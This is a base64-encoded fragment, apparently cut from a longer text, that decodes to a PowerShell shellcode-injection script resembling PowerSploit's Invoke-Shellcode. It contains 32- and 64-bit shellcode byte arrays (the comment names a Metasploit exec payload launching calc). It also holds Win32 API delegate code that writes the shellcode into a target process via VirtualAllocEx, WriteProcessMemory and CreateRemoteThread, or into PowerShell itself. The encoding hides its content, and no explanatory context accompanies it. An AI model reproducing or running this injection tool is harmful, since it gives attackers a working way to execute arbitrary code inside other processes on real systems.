yYywweDIwLDB4YzEsMHhjZiwweDBkLDB4MDEsMHhjNywweGUyLDB4ZjAsMHg1MiwweDU3LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDUyLDB4MTAsMHg4YiwweDQyLDB4M2MsMHgwMSwweGQwLDB4OGIsMHg0MCwweDc4LDB4ODUsMHhjMCwweDc0LDB4NGEsMHgwMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDhiLDB4NTgsMHgyMCwweDAxLDB4ZDMsMHhlMywweDNjLDB4NDksMHg4YiwweDM0LDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAxLDB4ZDYsMHgzMSwweGZmLDB4MzEsMHhjMCwweGFjLDB4YzEsMHhjZiwweDBkLDB4MDEsMHhjNywweDM4LDB4ZTAsMHg3NSwweGY0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMywweDdkLDB4ZjgsMHgzYiwweDdkLDB4MjQsMHg3NSwweGUyLDB4NTgsMHg4YiwweDU4LDB4MjQsMHgwMSwweGQzLDB4NjYsMHg4YiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MGMsMHg0YiwweDhiLDB4NTgsMHgxYywweDAxLDB4ZDMsMHg4YiwweDA0LDB4OGIsMHgwMSwweGQwLDB4ODksMHg0NCwweDI0LDB4MjQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDViLDB4NWIsMHg2MSwweDU5LDB4NWEsMHg1MSwweGZmLDB4ZTAsMHg1OCwweDVmLDB4NWEsMHg4YiwweDEyLDB4ZWIsMHg4NiwweDVkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2YSwweDAxLDB4OGQsMHg4NSwweGI5LDB4MDAsMHgwMCwweDAwLDB4NTAsMHg2OCwweDMxLDB4OGIsMHg2ZiwweDg3LDB4ZmYsMHhkNSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4YmIsMHhlMCwweDFkLDB4MmEsMHgwYSwweDY4LDB4YTYsMHg5NSwweGJkLDB4OWQsMHhmZiwweGQ1LDB4M2MsMHgwNiwweDdjLDB4MGEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDgwLDB4ZmIsMHhlMCwweDc1LDB4MDUsMHhiYiwweDQ3LDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwMCwweDUzLDB4ZmYsMHhkNSwweDYzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2MSwweDZjLDB4NjMsMHgwMCkKCiAgICAgICAgIyA2NC1iaXQgcGF5bG9hZAogICAgICAgICMgbXNmcGF5bG9hZCB3aW5kb3dzL3g2NC9leGVjIENNRD0iY2FsYyIgRVhJVEZVTkM9dGhyZWFkCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gQCgweGZjLDB4NDgsMHg4MywweGU0LDB4ZjAsMHhlOCwweGMwLDB4MDAsMHgwMCwweDAwLDB4NDEsMHg1MSwweDQxLDB4NTAsMHg1MiwweDUxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1NiwweDQ4LDB4MzEsMHhkMiwweDY1LDB4NDgsMHg4YiwweDUyLDB4NjAsMHg0OCwweDhiLDB4NTIsMHgxOCwweDQ4LDB4OGIsMHg1MiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MjAsMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGFjLDB4M2MsMHg2MSwweDdjLDB4MDIsMHgyYywweDIwLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsMHhlMiwweGVkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1MiwweDQxLDB4NTEsMHg0OCwweDhiLDB4NTIsMHgyMCwweDhiLDB4NDIsMHgzYywweDQ4LDB4MDEsMHhkMCwweDhiLDB4ODAsMHg4OCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4NDgsMHg4NSwweGMwLDB4NzQsMHg2NywweDQ4LDB4MDEsMHhkMCwweDUwLDB4OGIsMHg0OCwweDE4LDB4NDQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyMCwweDQ5LDB4MDEsMHhkMCwweGUzLDB4NTYsMHg0OCwweGZmLDB4YzksMHg0MSwweDhiLDB4MzQsMHg4OCwweDQ4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MzgsMHhlMCwweDc1LDB4ZjEsMHg0YywweDAzLDB4NGMsMHgyNCwweDA4LDB4NDUsMHgzOSwweGQxLDB4NzUsMHhkOCwweDU4LDB4NDQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwweDBjLDB4NDgsMHg0NCwweDhiLDB4NDAsMHgxYywweDQ5LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQwLDB4NDEsMHg4YiwweDA0LDB4ODgsMHg0OCwweDAxLDB4ZDAsMHg0MSwweDU4LDB4NDEsMHg1OCwweDVlLDB4NTksMHg1YSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NDEsMHg1OCwweDQxLDB4NTksMHg0MSwweDVhLDB4NDgsMHg4MywweGVjLDB4MjAsMHg0MSwweDUyLDB4ZmYsMHhlMCwweDU4LDB4NDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDU5LDB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OCwweGJhLDB4MDEsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDgsMHg4ZCwweDhkLDB4MDEsMHgwMSwweDAwLDB4MDAsMHg0MSwweGJhLDB4MzEsMHg4YiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmYsMHg4NywweGZmLDB4ZDUsMHhiYiwweGUwLDB4MWQsMHgyYSwweDBhLDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGQ1LDB4NDgsMHg4MywweGM0LDB4MjgsMHgzYywweDA2LDB4N2MsMHgwYSwweDgwLDB4ZmIsMHhlMCwweDc1LDB4MDUsMHhiYiwweDQ3LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxMywweDcyLDB4NmYsMHg2YSwweDAwLDB4NTksMHg0MSwweDg5LDB4ZGEsMHhmZiwweGQ1LDB4NjMsMHg2MSwweDZjLDB4NjMsMHgwMCkKICAgIH0KCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQogICAgewogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBzcGVjaWZpZWQgcHJvY2VzcyBJRAogICAgICAgICRPcGVuUHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIE9wZW5Qcm9jZXNzCiAgICAgICAgJE9wZW5Qcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1VJbnQzMl0sIFtCb29sXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkT3BlblByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblByb2Nlc3NBZGRyLCAkT3BlblByb2Nlc3NEZWxlZ2F0ZSkKICAgICAgICAkVmlydHVhbEFsbG9jRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2NFeAogICAgICAgICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRWaXJ0dWFsQWxsb2NFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NFeEFkZHIsICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlKQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBXcml0ZVByb2Nlc3NNZW1vcnkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbQnl0ZVtdXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIsICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlUmVtb3RlVGhyZWFkCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyLCAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJENsb3NlSGFuZGxlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ2xvc2VIYW5kbGUKICAgICAgICAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtCb29sXSkKICAgICAgICAkQ2xvc2VIYW5kbGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ2xvc2VIYW5kbGVBZGRyLCAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSkKICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byBQSUQ6ICRQcm9jZXNzSWQiCiAgICAgICAgCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggJ0RvIHlvdSB3aXNoIHRvIGNhcnJ5IG91dCB5b3VyIGV2aWwgcGxhbnM/JywKICAgICAgICAgICAgICAgICAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbmplY3RpbmcgaW50byAkKChHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJZCkuUHJvY2Vzc05hbWUpICgkUHJvY2Vzc0lkKSEiICkgKQogICAgICAgIHsKICAgICAgICAgICAgSW5qZWN0LVJlbW90ZVNoZWxsY29kZSAkUHJvY2Vzc0lkCiAgICAgICAgfQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBjdXJyZW50bHkgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MKICAgICAgICAkVmlydHVhbEFsbG9jQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jCiAgICAgICAgJFZpcnR1YWxBbGxvY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJFZpcnR1YWxBbGxvYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NBZGRyLCAkVmlydHVhbEFsbG9jRGVsZWdhdGUpCiAgICAgICAgJFZpcnR1YWxGcmVlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEZyZWUKICAgICAgICAkVmlydHVhbEZyZWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdKSAoW0Jvb2xdKQogICAgICAgICRWaXJ0dWFsRnJlZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUFkZHIsICRWaXJ0dWFsRnJlZURlbGVnYXRlKQogICAgICAgICRDcmVhdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV2FpdEZvclNpbmdsZU9iamVjdAogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0pIChbSW50XSkKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciwgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSkKICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUG93ZXJTaGVsbCIKICAgICAgICAKICAgICAgICBpZiAoICRGb3JjZSAtb3IgJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAnRG8geW91IHdpc2ggdG8gY2Fycnkgb3V0IHlvdXIgZXZpbCBwbGFucz8nLAogICAgICAgICAgICAgICAgICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzISIgKSApCiAgICAgICAgewogICAgICAgICAgICBJbmplY3QtTG9jYWxTaGVsbGNvZGUKICAgICAgICB9CiAgICB9CiAgICAKfQ==
